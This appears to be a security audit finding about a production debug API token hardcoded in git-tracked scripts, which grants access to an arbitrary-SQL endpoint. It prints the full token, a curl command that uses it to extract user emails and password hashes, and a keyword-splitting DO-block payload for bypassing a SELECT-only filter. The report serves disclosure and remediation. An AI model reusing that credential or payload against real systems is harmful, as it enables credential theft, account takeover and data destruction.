---
Phase: 2
Sequence: 001
Slug: hardcoded-debug-api-token-in-git
Verdict: VALID
Severity-Original: CRITICAL
Confidence: high
Anchor: scripts/debug-weather-join.ts
Anchor-Sha8: d5d04db9
---

## Summary

Two shell/Python CLI scripts in the `scripts/` directory — siblings of the anchor file `debug-weather-join.ts` — contain a hardcoded Bearer token (`ac504f9dc9c07ad7d3fb53ecefe0ccecd2beab6922d0bb6eb3bc1898a8919da1`) that grants full access to the debug API at `https://airways.gg/api/debug/*`, including the arbitrary-SQL endpoint at `/api/debug/sql`. Both scripts are tracked in git, meaning the token is permanently preserved in the repository history and visible to anyone with repository access. The token authenticates to the production deployment at `airways.gg`.

## Location

- `scripts/airways-cli.sh:6` — hardcoded `AUTH` variable containing full Bearer token
- `scripts/airways-cli.py:9` — hardcoded `AUTH` variable containing same Bearer token
- `apps/web/src/hooks.server.ts:7-13` — auth gate that validates the token for `/api/debug/*`
- `apps/web/src/lib/server/debug-helpers.ts:103-112` — `validateDebugToken()` implementation
- `apps/web/src/routes/api/debug/sql/+server.ts:1-52` — arbitrary SQL execution endpoint
- `scripts/debug-weather-join.ts` — anchor file in same directory, demonstrating debug DB access pattern

## Attacker Control

The attacker does not need to supply any input. The token is a static, hardcoded value committed to the git repository at `scripts/airways-cli.sh:6` and `scripts/airways-cli.py:9`. Anyone with read access to the repository (public or internal) can extract the token and use it to authenticate to the production API at `https://airways.gg`.

## Trust Boundary Crossed

The debug API endpoints (`/api/debug/*`) are intended to be protected by a secret Bearer token configured via the `DEBUG_API_TOKEN` environment variable (see `docker-compose.prod.yml:26` and `docker-compose.yml:26`). The `hooks.server.ts` gate (`apps/web/src/hooks.server.ts:7-13`) enforces this boundary. By hardcoding the token in git-tracked scripts, the secret is exposed outside the intended trust boundary — it becomes available to anyone with repository access rather than being restricted to authorized operators with production environment access.

## Impact

An attacker who extracts the token from git can:

1. **Execute arbitrary SQL** via `POST /api/debug/sql` with `{"sql": "<query>"}`. The endpoint uses `sql.raw()` (`apps/web/src/routes/api/debug/sql/+server.ts:38`) which bypasses Drizzle ORM parameterization. While a keyword-based filter restricts queries to SELECT-like statements, this still allows reading:
   - `users` table: email addresses and password hashes (`packages/database/schema.ts:22-31`)
   - `sessions` table: session tokens for account takeover (`packages/database/schema.ts:33-43`)
   - All flight data, weather data, scraper logs, push subscriptions, and operational data

2. **Access all debug endpoints**: `/api/debug/flights`, `/api/debug/positions`, `/api/debug/scrapers`, `/api/debug/ui/*`

3. **Potentially bypass the SELECT-only restriction** via PostgreSQL `DO` blocks with string-split keywords (e.g., `SELECT 1; DO $$ BEGIN EXECUTE 'DEL' || 'ETE FROM flights'; END $$;`) that evade the keyword-based blacklist in `validateSqlQuery()` (`apps/web/src/lib/server/debug-helpers.ts:86-91`).

## Evidence

**Hardcoded token in git-tracked file** (`scripts/airways-cli.sh:6`):
```bash
AUTH="Authorization: Bearer ac504f9dc9c07ad7d3fb53ecefe0ccecd2beab6922d0bb6eb3bc1898a8919da1"
```

**Same token in Python variant** (`scripts/airways-cli.py:9`):
```python
AUTH = "ac504f9dc9c07ad7d3fb53ecefe0ccecd2beab6922d0bb6eb3bc1898a8919da1"
```

**Both files tracked in git** (confirmed via `git ls-files`):
```
scripts/airways-cli.py
scripts/airways-cli.sh
```

**Auth gate uses this token** (`apps/web/src/hooks.server.ts:7-13`):
```typescript
if (event.url.pathname.startsWith('/api/debug/')) {
    const auth = event.request.headers.get('authorization');
    if (!validateDebugToken(auth, env.DEBUG_API_TOKEN)) {
      return json({ error: 'Unauthorized' }, { status: 401 });
    }
}
```

**Token validation is exact match** (`apps/web/src/lib/server/debug-helpers.ts:107-111`):
```typescript
export function validateDebugToken(
  authHeader: string | null,
  expectedToken: string | undefined,
): boolean {
  if (!expectedToken || !authHeader) return false;
  return authHeader === `Bearer ${expectedToken}`;
}
```

**Arbitrary SQL endpoint uses `sql.raw()`** (`apps/web/src/routes/api/debug/sql/+server.ts:38`):
```typescript
result = await d.execute(sql`${sql.raw(query)}`);
```

**Sensitive tables exposed** (`packages/database/schema.ts:22-43`):
```typescript
export const users = pgTable('users', {
  id: varchar('id', { length: 36 }).primaryKey(),
  email: varchar('email', { length: 255 }).notNull().unique(),
  passwordHash: varchar('password_hash', { length: 255 }).notNull(),
  role: userRoleEnum('role').notNull().default('user'),
  ...
});

export const sessions = pgTable('sessions', {
  id: varchar('id', { length: 36 }).primaryKey(),
  userId: varchar('user_id', { length: 36 }).notNull(),
  token: varchar('token', { length: 255 }).notNull().unique(),
  expiresAt: timestamp('expires_at').notNull(),
  ...
});
```

## Exploit Sketch

1. Clone or access the airways.gg git repository
2. Extract the token from `scripts/airways-cli.sh` (line 6)
3. Send authenticated requests to the production API:
   ```bash
   curl -H "Authorization: Bearer ac504f9dc9c07ad7d3fb53ecefe0ccecd2beab6922d0bb6eb3bc1898a8919da1" \
        -H "Content-Type: application/json" \
        -d '{"sql": "SELECT email, password_hash FROM users"}' \
        https://airways.gg/api/debug/sql
   ```
4. Extract all user credentials and session tokens
5. Use session tokens for account takeover, or crack password hashes offline

## Open Questions

- Whether the token has been rotated since the scripts were committed (if the `.env` value differs from the hardcoded value in the scripts, the scripts would still contain a historical token visible in git history)
- Whether the same token is used in production or was only for development
- Whether the `DO` block bypass (string-split keywords via `EXECUTE 'DEL' || 'ETE FROM flights'` inside a PL/pgSQL `DO` block) is practically exploitable through the drizzle-orm `execute()` path — requires testing to confirm multi-statement handling
